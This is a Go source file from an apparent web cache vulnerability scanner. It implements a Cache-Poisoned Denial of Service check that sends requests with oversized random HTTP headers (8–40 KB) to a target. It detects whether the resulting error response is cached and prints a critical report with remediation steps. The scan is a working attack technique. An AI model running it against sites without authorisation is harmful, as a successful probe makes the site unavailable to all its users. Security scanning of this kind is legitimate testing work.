package cpdos

import (
	"fmt"
	"net/http"

	"github.com/projectdiscovery/gologger"
	"github.com/wealeson1/wcpvs/internal/models"
	"github.com/wealeson1/wcpvs/pkg/output"
	"github.com/wealeson1/wcpvs/pkg/utils"
)

type HHO struct {
	payload string
}

var HHOTecnique *HHO

func init() {
	HHOTecnique = NewHHO()
}

func NewHHO() *HHO {
	payload := utils.RandomString(20480)
	return &HHO{
		payload: payload,
	}
}

func (h *HHO) Scan(target *models.TargetStruct) {
	if target.Cache.NoCache {
		return
	}

	// 创建验证器
	verifier := utils.NewPoisoningVerifier()
	baselineStatus := target.Response.StatusCode

	headerSize := 8192
	maxSize := 40960

	for headerSize <= maxSize {
		randomHeader := utils.RandomString(5)
		headerValue := utils.RandomString(headerSize)

		// 创建攻击请求（带超大头部）
		attackReq, err := utils.CloneRequest(target.Request)
		if err != nil {
			gologger.Debug().Msgf("HHO: Failed to clone request: %v", err)
			headerSize = headerSize + 1024
			continue
		}
		attackReq.Header.Set(randomHeader, headerValue)

		// 创建验证请求（不带超大头部）
		verifyReq, err := utils.CloneRequest(target.Request)
		if err != nil {
			headerSize = headerSize + 1024
			continue
		}

		// 使用验证框架验证
		result, err := verifier.Verify(target, attackReq, verifyReq)
		if err != nil {
			gologger.Debug().Msgf("HHO verification failed for size %d: %v", headerSize, err)
			headerSize = headerSize + 1024
			continue
		}

		// 检查是否存在漏洞
		if result.IsVulnerable {
			// 检查是否是特定的错误状态码
			isExpectedError := (result.AttackStatus == http.StatusBadRequest ||
				result.AttackStatus == 431 ||
				result.AttackStatus == 413)

			if isExpectedError || result.AttackStatus != baselineStatus {
				// 直接使用验证框架保存的body
				respBody := result.VerifyBody

				// 输出详细报告
				h.reportVulnerability(target, headerSize, baselineStatus, result.VerifyResp, respBody)

				gologger.Debug().Msgf("HHO poisoning verified in %v (size: %d, attack: %d, verify: %d)",
					result.TotalTime, headerSize, result.AttackStatus, result.VerifyStatus)
				return
			}
		}

		headerSize = headerSize + 1024
	}
}

// reportVulnerability 输出HHO CPDoS漏洞的详细报告
func (h *HHO) reportVulnerability(target *models.TargetStruct, headerSize, baselineStatus int,
	resp *http.Response, respBody []byte) {

	// 构建攻击请求
	randomHeader := utils.RandomString(5)
	testReq, err := utils.CloneRequest(target.Request)
	if err != nil || testReq == nil {
		gologger.Debug().Msgf("Failed to clone request for HHO report: %v", err)
		testReq = target.Request // Fallback
	}
	if testReq != nil {
		testReq.Header.Set(randomHeader, utils.RandomString(headerSize))
	}

	// 提取缓存键
	cacheKeys := []string{}
	if target.Cache.CKIsGet {
		cacheKeys = append(cacheKeys, target.Cache.GetCacheKeys...)
	}
	if target.Cache.CKIsHeader {
		cacheKeys = append(cacheKeys, target.Cache.HeaderCacheKeys...)
	}

	// 格式化请求和响应
	reqStr := output.FormatRequestSimple(testReq, fmt.Sprintf("Huge header: %s with %d bytes", randomHeader, headerSize))
	bodySnippet := output.ExtractBodySnippet(respBody, 300)
	respStr := output.FormatResponse(resp, bodySnippet, "")

	// 创建漏洞报告
	report := &output.VulnerabilityReport{
		Severity:     output.SeverityCritical,
		Type:         output.VulnTypeCPDoSHHO,
		Target:       target.Request.URL.String(),
		CDN:          utils.DetectCDNType(target.Response),
		CacheKeys:    cacheKeys,
		AttackVector: fmt.Sprintf("Huge HTTP header (%d bytes) causes server error that gets cached", headerSize),
		Request:      reqStr,
		Response:     respStr,
		Impact: fmt.Sprintf("Service becomes unavailable for ALL users - cached error response (status %d instead of %d)",
			resp.StatusCode, baselineStatus),
		Persistent: true,
		Remediation: []string{
			"Configure cache to not cache error responses (4xx, 5xx)",
			"Implement header size validation before caching",
			"Set appropriate cache control headers for error responses",
			"Monitor and alert on cached error responses",
		},
	}

	report.Print()
}
